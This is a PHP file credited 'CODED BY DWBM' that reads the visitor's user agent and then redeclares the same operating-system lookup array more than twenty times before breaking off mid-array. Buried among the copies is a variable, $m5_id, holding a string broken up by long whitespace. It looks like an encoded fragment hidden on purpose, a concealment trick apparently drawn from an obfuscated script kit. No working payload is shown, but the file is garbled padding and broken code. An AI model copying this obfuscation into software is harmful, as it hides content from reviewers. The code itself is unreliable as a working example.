<?php
/* ==================== || CODED BY DWBM || ==================== */
@session_start();
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );

$m5_id=                                                 'dGx,         v.b        2.s
                                                         uY2,         9.t';													

														  
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );


$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
